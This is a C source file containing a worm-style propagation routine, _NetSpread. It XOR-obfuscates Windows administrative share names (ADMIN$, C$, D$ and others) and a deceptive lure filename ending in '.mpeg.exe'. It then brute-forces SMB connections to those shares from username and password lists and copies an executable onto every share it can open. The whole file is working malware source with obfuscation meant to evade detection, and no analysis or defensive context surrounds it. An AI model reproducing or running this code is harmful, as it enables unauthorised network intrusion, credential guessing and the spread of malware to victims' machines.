#include "data_globals.h"
#include <stdio.h>
#include <string.h>
#include <stddef.h>  // for size_t

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void _NetSpread(uint32_t param_1, LPCSTR param_2)
{
    NETRESOURCEA net_inf;
    char nb_remote[MAX_PATH];
    DWORD ret, share_cnt, users_cnt, pwd_cnt;

    // Encrypted share names, each with a unique key
    volatile char sz_shareddocs[] = {
        'S'^0x3E, 'h'^0x3E, 'a'^0x3E, 'r'^0x3E, 'e'^0x3E, 'd'^0x3E, 'D'^0x3E, 'o'^0x3E,
        'c'^0x3E, 's'^0x3E, 0x00^0x3E
    };
    volatile char sz_admin[] = {
        'A'^0x7A, 'D'^0x7A, 'M'^0x7A, 'I'^0x7A, 'N'^0x7A, '$'^0x7A, 0x00^0x7A
    };
    volatile char sz_cdollar[] = {
        'C'^0x1F, '$'^0x1F, 0x00^0x1F
    };
    volatile char sz_ddollar[] = {
        'D'^0x2C, '$'^0x2C, 0x00^0x2C
    };
    volatile char sz_edollar[] = {
        'E'^0x5A, '$'^0x5A, 0x00^0x5A
    };
    volatile char sz_c[] = {
        'C'^0x6B, 0x00^0x6B
    };
    volatile char sz_d[] = {
        'D'^0x4E, 0x00^0x4E
    };

    // Decrypt all share names before the loop
    xor_decrypt(sz_shareddocs, sizeof(sz_shareddocs), 0x3E);
    xor_decrypt(sz_admin, sizeof(sz_admin), 0x7A);
    xor_decrypt(sz_cdollar, sizeof(sz_cdollar), 0x1F);
    xor_decrypt(sz_ddollar, sizeof(sz_ddollar), 0x2C);
    xor_decrypt(sz_edollar, sizeof(sz_edollar), 0x5A);
    xor_decrypt(sz_c, sizeof(sz_c), 0x6B);
    xor_decrypt(sz_d, sizeof(sz_d), 0x4E);

    char *share_name[] = {
        (char*)sz_shareddocs, (char*)sz_admin, (char*)sz_cdollar,
        (char*)sz_ddollar, (char*)sz_edollar, (char*)sz_c, (char*)sz_d
    };

    // "\\porno_movie.mpeg.exe" XOR'd with key 0x23
    volatile char sz_filename[] = {
        '\\'^0x23, 'p'^0x23, 'o'^0x23, 'r'^0x23, 'n'^0x23, 'o'^0x23, '_'^0x23, 'm'^0x23,
        'o'^0x23, 'v'^0x23, 'i'^0x23, 'e'^0x23, '.'^0x23, 'm'^0x23, 'p'^0x23, 'e'^0x23,
        'g'^0x23, '.'^0x23, 'e'^0x23, 'x'^0x23, 'e'^0x23, 0x00^0x23
    };
    xor_decrypt(sz_filename, sizeof(sz_filename), 0x23);

    for (share_cnt = 0; share_cnt < 7; share_cnt++)
    {
        for (users_cnt = 0; users_cnt < USERS_NUM; users_cnt++)
        {
            for (pwd_cnt = 0; pwd_cnt < PWD_NUM; pwd_cnt++)
            {
                memset(nb_remote, 0, MAX_PATH);
                sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);

                memset(&net_inf, 0, sizeof(net_inf));
                net_inf.dwDisplayType = RESOURCETYPE_ANY;
                net_inf.lpRemoteName = nb_remote;
                net_inf.lpLocalName = NULL;
                net_inf.lpProvider = NULL;

                ret = WNetAddConnection2A(&net_inf,
                                          passwords_list[pwd_cnt],
                                          users_list[users_cnt],
                                          0);

                if (ret == NO_ERROR)
                {
                    strcat(nb_remote, (char*)sz_filename);
                    CopyFileA(param_2, nb_remote, FALSE);

                    memset(nb_remote, 0, MAX_PATH);
                    sprintf(nb_remote, "%s\\%s", (char *)param_1, share_name[share_cnt]);
                    WNetCancelConnectionA(nb_remote, TRUE);
                }
            }
        }
    }
}
#pragma optimize("", on)
